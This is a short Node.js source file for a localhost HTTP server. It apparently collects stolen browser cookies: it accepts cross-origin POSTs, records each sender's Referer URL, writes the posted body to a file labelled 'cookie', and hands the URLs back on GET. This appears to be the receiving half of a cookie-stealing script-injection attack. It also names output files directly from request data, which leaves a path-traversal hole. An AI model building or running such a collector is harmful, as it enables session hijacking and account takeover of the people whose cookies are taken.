var http = require('http');
var port = 8080;
var ip = '127.0.0.1';
var fs = require('fs');
var URLStorage = [];
var headers = {
  "access-control-allow-origin": "*",
  "access-control-allow-methods": "GET, POST, PUT, DELETE, OPTIONS",
  "access-control-allow-headers": "content-type, accept",
  "access-control-max-age": 10, // Seconds.
  'Content-Type': "text/html"
};
var server = http.createServer(function(request, response){
	var url = request.headers.referer;
	var str = '';
	if (request.method === 'POST'){
		URLStorage.push(url);
		request.on('data', function(chunk){
			str += chunk;
		});
		request.on('end', function(){
			fs.writeFile(str + '.txt', 'url: ' + url + '\n' + 'cookie: ' + str, function(err){
				if (err){
					console.log(err);
				} else {
					console.log('Cookie Saved');
				}
			})
		});
	}
	if (request.method === 'GET'){
		var result = URLStorage.shift();
	}
	response.writeHead(200, headers);
	response.end(JSON.stringify(result));
});
server.listen(port, ip);
console.log('Server listening on port 8080 of localhost');